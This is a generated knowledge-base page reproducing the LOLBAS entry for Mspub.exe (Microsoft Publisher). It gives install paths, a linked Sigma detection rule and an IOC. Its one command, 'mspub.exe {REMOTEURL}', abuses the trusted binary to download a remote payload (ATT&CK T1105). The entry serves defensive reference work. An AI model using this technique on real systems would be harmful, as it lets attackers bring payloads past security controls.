---
title: "Mspub.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OtherMSBinaries/Mspub.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Mspub.yml"
build_date: "2026-04-27 19:14:21"
category: "OtherMSBinaries"
aliases:
  - "Mspub.exe"
functions:
  - "Download"
attack_technique_ids:
  - "T1105"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Microsoft Publisher

## Paths

- `C:\Program Files (x86)\Microsoft Office 16\ClientX86\Root\Office16\MSPUB.exe`
- `C:\Program Files\Microsoft Office 16\ClientX64\Root\Office16\MSPUB.exe`
- `C:\Program Files (x86)\Microsoft Office\Office16\MSPUB.exe`
- `C:\Program Files\Microsoft Office\Office16\MSPUB.exe`
- `C:\Program Files (x86)\Microsoft Office 15\ClientX86\Root\Office15\MSPUB.exe`
- `C:\Program Files\Microsoft Office 15\ClientX64\Root\Office15\MSPUB.exe`
- `C:\Program Files (x86)\Microsoft Office\Office15\MSPUB.exe`
- `C:\Program Files\Microsoft Office\Office15\MSPUB.exe`
- `C:\Program Files (x86)\Microsoft Office 14\ClientX86\Root\Office14\MSPUB.exe`
- `C:\Program Files\Microsoft Office 14\ClientX64\Root\Office14\MSPUB.exe`
- `C:\Program Files (x86)\Microsoft Office\Office14\MSPUB.exe`
- `C:\Program Files\Microsoft Office\Office14\MSPUB.exe`

## Commands

### 1. Download

Downloads payload from remote server

```cmd
mspub.exe {REMOTEURL}
```

- Use Case: It will download a remote payload and place it in INetCache.
- Privileges: User
- Operating System: Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_mspub_download.yml
- IOC: Suspicious Office application internet/network traffic

## Acknowledgements

- {'Person': 'Nir Chako (Pentera)', 'Handle': '@C_h4ck_0'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Mspub.yml)
